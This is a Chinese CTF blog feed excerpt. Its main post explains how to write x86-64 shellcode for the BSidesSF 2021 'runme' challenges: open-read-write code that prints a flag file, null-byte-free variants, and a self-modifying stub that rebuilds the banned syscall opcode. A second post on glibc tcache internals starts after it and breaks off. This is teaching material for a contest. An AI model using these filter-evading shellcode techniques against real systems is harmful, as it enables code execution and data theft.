    <content type="html"><![CDATA[<p>写这个主要是校赛出了一道题，来源于国外的一道题目</p><p>具体的话可以看[这个][<a href="https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚" target="_blank" rel="noopener">https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚</a></p><h1 id="0x01-method"><a href="#0x01-method" class="headerlink" title="0x01 method"></a>0x01 method</h1><h2 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h2><p>首先我们需要这个nasm东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whereis nasm</span><br><span class="line">&#x2F;&#x2F;如果没有，直接</span><br><span class="line">sudo apt-get install nasm</span><br></pre></td></tr></table></figure><p>接下来我们来编译一个汇编文件</p><p>具体内容如下，其实就是输出hello,world</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global main            ; 指定入口函数</span><br><span class="line">main:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 hello.asm -o hello.o</span><br><span class="line">&#x2F;&#x2F;nasm -f [输出文件格式] [源文件] -o [目标文件]</span><br><span class="line">gcc -m32 hello.o -o hello</span><br></pre></td></tr></table></figure><p>应该可以看到运行出了hello,world，其实我们也就是从汇编然后编译执行了一个程序</p><p>但我们如何查看其中十六进制数据呢？</p><p>当然有多种方法</p><p>比如objdump,objcopy等</p><p>这里主要用一下objcopy</p><p>具体每个工具用法可以自己去查，这里就不说了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy -O binary hello.o code</span><br><span class="line">xxd -i code</span><br></pre></td></tr></table></figure><p>这样我们就生成了自己的shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ xxd -i code</span><br><span class="line">unsigned char code[] &#x3D; &#123;</span><br><span class="line">  0xba, 0x0e, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb, 0x01,</span><br><span class="line">  0x00, 0x00, 0x00, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xbb, 0x00,</span><br><span class="line">  0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80</span><br><span class="line">&#125;;</span><br><span class="line">unsigned int code_len &#x3D; 34;</span><br></pre></td></tr></table></figure><h1 id="0x02-challenge"><a href="#0x02-challenge" class="headerlink" title="0x02 challenge"></a>0x02 challenge</h1><p>这里总共分为三个challenge，主要是针对64位的</p><p>也就是说我们参数在rdi rsi rdx中</p><p>我们首先得要知道写shellcode目的是什么？</p><p>在CTF中我们通常有两种一种就是拿到/bin/sh，另一种就是就是知道flag路径直接进行ORW</p><p>先来看第一个挑战吧，这里原文作者都是用ORW(open read write)来做的，我们是来学东西的，也不必纠结那些东西。</p><h2 id="runme1"><a href="#runme1" class="headerlink" title="runme1"></a>runme1</h2><p>先来看原作的第一个shellcode</p><p>注释都已经很详细了</p><p>就是很简单的ORW</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  mov rax, 2 ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  call getfilename ; Pushes the next address onto the stack and jumps down</span><br><span class="line">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot;,0 ; The literal flag, null terminated</span><br><span class="line">getfilename:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line">  mov rsi, 0 ; Flags &#x3D; 0</span><br><span class="line">  mov rdx, 0 ; Mode &#x3D; 0</span><br><span class="line">  syscall ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  mov rax, 0 ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  pop rdi ; Move the file handle into rdi</span><br><span class="line">  pop rsi ; Use the same buffer where the filename pointer is stored (it&#39;s readable and writable)</span><br><span class="line">  mov rdx, 30 ; rdx is the count</span><br><span class="line">  syscall ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  mov rax, 1 ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  mov rdi, 1 ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line">  mov rdx, 30 ; rdx is the count again</span><br><span class="line">  syscall ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  mov rax, 60 ; Syscall 60 &#x3D; exit</span><br><span class="line">  mov rdi, 0 ; Exit with code 0</span><br><span class="line">  syscall ; Perform an exit</span><br></pre></td></tr></table></figure><h2 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h2><p>这个challenge加了限制条件，没有空字节</p><p>先看一下第一个写的shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 1</span><br><span class="line">00000000  B802000000        mov eax,0x2</span><br><span class="line">00000005  E813000000        call qword 0x1d</span><br><span class="line">0000000A  2F                db 0x2f</span><br><span class="line">0000000B  686F6D652F        push qword 0x2f656d6f</span><br><span class="line">00000010  63                db 0x63</span><br><span class="line">00000011  7466              jz 0x79</span><br><span class="line">00000013  2F                db 0x2f</span><br><span class="line">00000014  666C              o16 insb</span><br><span class="line">00000016  61                db 0x61</span><br><span class="line">00000017  672E7478          cs jz 0x93</span><br><span class="line">0000001B  7400              jz 0x1d</span><br><span class="line">0000001D  5F                pop rdi</span><br><span class="line">0000001E  BE00000000        mov esi,0x0</span><br><span class="line">00000023  BA00000000        mov edx,0x0</span><br><span class="line">00000028  0F05              syscall</span><br><span class="line">0000002A  57                push rdi</span><br><span class="line">0000002B  50                push rax</span><br><span class="line">0000002C  B800000000        mov eax,0x0</span><br><span class="line">00000031  5F                pop rdi</span><br><span class="line">00000032  5E                pop rsi</span><br><span class="line">00000033  BA1E000000        mov edx,0x1e</span><br><span class="line">00000038  0F05              syscall</span><br><span class="line">0000003A  B801000000        mov eax,0x1</span><br><span class="line">0000003F  BF01000000        mov edi,0x1</span><br><span class="line">00000044  BA1E000000        mov edx,0x1e</span><br><span class="line">00000049  0F05              syscall</span><br><span class="line">0000004B  B83C000000        mov eax,0x3c</span><br><span class="line">00000050  BF00000000        mov edi,0x0</span><br><span class="line">00000055  0F05              syscall</span><br></pre></td></tr></table></figure><p>发现有很多0字节，这里要想不出现00字节该怎么办呢？</p><p>我们首先得看到哪里有0字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000005  E813000000        call qword 0x1d</span><br><span class="line">&#x2F;&#x2F;call A+0x13 &#x3D; call 0x1d</span><br></pre></td></tr></table></figure><p>call中有很多00字节，这里可以用jmp替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000005  EB13              jmp short 0x1d</span><br></pre></td></tr></table></figure><p>这里提到了一个calling backwards，主要就是调用上方代码。</p><p>这里还有几个trick</p><ol><li>mov REG,0 ==&gt;xor REG,REG</li><li>rax==&gt;al</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 2</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; filename</span><br><span class="line">  jmp short getfilename_bottom</span><br><span class="line">getfilename_top:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; flags</span><br><span class="line">  xor rsi, rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; mode</span><br><span class="line">  xor rdx, rdx</span><br><span class="line"></span><br><span class="line">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  xor rax, rax</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; file handle</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; buffer (same as filename)</span><br><span class="line">  pop rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; count</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  xor rax, rax</span><br><span class="line">  inc rax</span><br><span class="line"></span><br><span class="line">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  xor rdi, rdi</span><br><span class="line">  inc rdi</span><br><span class="line"></span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line"></span><br><span class="line">  ; rdx is the count again</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  ; Syscall 60 &#x3D; exit</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 60</span><br><span class="line"></span><br><span class="line">  ; Exit with code 0</span><br><span class="line">  xor rdi, rdi</span><br><span class="line"></span><br><span class="line">  ; Perform an exit</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">getfilename_bottom:</span><br><span class="line">  call getfilename_top</span><br><span class="line"></span><br><span class="line">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure><p>看一下这个，是没有00字节的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 a</span><br><span class="line">00000000  4831C0            xor rax,rax</span><br><span class="line">00000003  B002              mov al,0x2</span><br><span class="line">00000005  EB34              jmp short 0x3b</span><br><span class="line">00000007  5F                pop rdi</span><br><span class="line">00000008  4831F6            xor rsi,rsi</span><br><span class="line">0000000B  4831D2            xor rdx,rdx</span><br><span class="line">0000000E  0F05              syscall</span><br><span class="line">00000010  57                push rdi</span><br><span class="line">00000011  50                push rax</span><br><span class="line">00000012  4831C0            xor rax,rax</span><br><span class="line">00000015  5F                pop rdi</span><br><span class="line">00000016  5E                pop rsi</span><br><span class="line">00000017  4831D2            xor rdx,rdx</span><br><span class="line">0000001A  B21E              mov dl,0x1e</span><br><span class="line">0000001C  0F05              syscall</span><br><span class="line">0000001E  4831C0            xor rax,rax</span><br><span class="line">00000021  48FFC0            inc rax</span><br><span class="line">00000024  4831FF            xor rdi,rdi</span><br><span class="line">00000027  48FFC7            inc rdi</span><br><span class="line">0000002A  4831D2            xor rdx,rdx</span><br><span class="line">0000002D  B21E              mov dl,0x1e</span><br><span class="line">0000002F  0F05              syscall</span><br><span class="line">00000031  4831C0            xor rax,rax</span><br><span class="line">00000034  B03C              mov al,0x3c</span><br><span class="line">00000036  4831FF            xor rdi,rdi</span><br><span class="line">00000039  0F05              syscall</span><br><span class="line">0000003B  E8C7FFFFFF        call qword 0x7</span><br><span class="line">00000040  2F                db 0x2f</span><br><span class="line">00000041  686F6D652F        push qword 0x2f656d6f</span><br><span class="line">00000046  63                db 0x63</span><br><span class="line">00000047  7466              jz 0xaf</span><br><span class="line">00000049  2F                db 0x2f</span><br><span class="line">0000004A  666C              o16 insb</span><br><span class="line">0000004C  61                db 0x61</span><br><span class="line">0000004D  672E7478          cs jz 0xc9</span><br><span class="line">00000051  74                db 0x74</span><br></pre></td></tr></table></figure><h2 id="runme3"><a href="#runme3" class="headerlink" title="runme3"></a>runme3</h2><p>这个直接把<code>syscall</code>ban了，那我们应该用什么呢？</p><p>也就是<code>0f</code> <code>05</code></p><p>这里的trick还是很有意思的，自己写一个编码器，那么我们来看一下如何实现吧？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting</span><br><span class="line">jmp short my_fake_syscall_bottom</span><br><span class="line">  my_fake_syscall_top:</span><br><span class="line">  pop rbx ; Pop the address of the syscall-minus-1 block into rbx</span><br><span class="line">  add word [rbx], 0x0101 ; Increment the two bytes - 0x0e -&gt; 0x0f and 0x04 -&gt; 0x05</span><br><span class="line"></span><br><span class="line">  ; Now rbx points to &quot;syscall &#x2F; ret&quot;, so we can just call that any time we</span><br><span class="line">  ; need a syscall!</span><br><span class="line">  ;</span><br><span class="line">  ; Other than changing &quot;syscall&quot; to &quot;call rbx&quot;, the rest is identical!</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 2</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; filename</span><br><span class="line">  jmp short getfilename_bottom</span><br><span class="line">getfilename_top:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; flags</span><br><span class="line">  xor rsi, rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; mode</span><br><span class="line">  xor rdx, rdx</span><br><span class="line"></span><br><span class="line">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  xor rax, rax</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; file handle</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; buffer (same as filename)</span><br><span class="line">  pop rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; count</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  xor rax, rax</span><br><span class="line">  inc rax</span><br><span class="line"></span><br><span class="line">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  xor rdi, rdi</span><br><span class="line">  inc rdi</span><br><span class="line"></span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line"></span><br><span class="line">  ; rdx is the count again</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  ; Syscall 60 &#x3D; exit</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 60</span><br><span class="line"></span><br><span class="line">  ; Exit with code 0</span><br><span class="line">  xor rdi, rdi</span><br><span class="line"></span><br><span class="line">  ; Perform an exit</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">my_fake_syscall_bottom:</span><br><span class="line">  call my_fake_syscall_top</span><br><span class="line"></span><br><span class="line">  ; This little block will become &quot;syscall &#x2F; ret&quot;</span><br><span class="line">  db 0x0e, 0x04 ; syscall is actually 0x0f 0x05</span><br><span class="line">  ret ; Return after doing a syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getfilename_bottom:</span><br><span class="line">  call getfilename_top</span><br><span class="line"></span><br><span class="line">  db &quot;.&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这个主要是校赛出了一道题，来源于国外的一道题目&lt;/p&gt;
&lt;p&gt;具体的话可以看[这个][&lt;a href=&quot;https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-prime</summary>
      
    
    
    
    
    <category term="shellcode" scheme="https://pz1o.top/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>tcache</title>
    <link href="https://pz1o.top/2021/03/08/tcache/"/>
    <id>https://pz1o.top/2021/03/08/tcache/</id>
    <published>2021-03-08T10:05:58.000Z</published>
    <updated>2021-03-18T10:03:52.248Z</updated>
    
    <content type="html"><![CDATA[<p>down的wiki，便于自己多看。主要梳理一下结构。</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h1><p>tcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。</p><h2 id="1-结构体"><a href="#1-结构体" class="headerlink" title="1.结构体"></a>1.结构体</h2><p><code>tcache_entry</code> 和 <code>tcache_perthread_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><blockquote><p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p><p>需要注意的是这里的 <strong>next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</strong></p><p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p><p>如图<img src="/2021/03/08/tcache/20210201102625163.png" alt="在这里插入图片描述"></p></blockquote><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><blockquote><p>tcache_perthread_struct是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x251。每一个thread都会维护一个tcache_perthread_struct结构体，一共有TCACHE_MAX_BINS个计数器TCACHE_MAX_BINS项tcache_entry。</p><ul><li>tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk</li><li>counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</li></ul><p><img src="/2021/03/08/tcache/20210201160752119.jpg" alt="在这里插入图片描述"></p></blockquote><h2 id="2-执行流程"><a href="#2-执行流程" class="headerlink" title="2.执行流程"></a>2.执行流程</h2><ol><li>第一次malloc，会分配一块大内存存放<code>tcache_perthread_struct</code>，一般为0x251</li><li>释放chunk时，如果chunk的size小于small bin size，在<strong>进入tcache之前</strong>会先放进fastbin或者unsorted bin中</li><li>在<strong>放入tcache后</strong>：<ul><li>先放到对应的tcache中，直到tcache被填满（7个）</li><li><strong>tcache被填满后</strong>，接下来再释放chunk，就会直接放进fastbin或者unsorted bin中</li><li>tcache中的chunk<strong>不会发生合并</strong>，不取消inuse 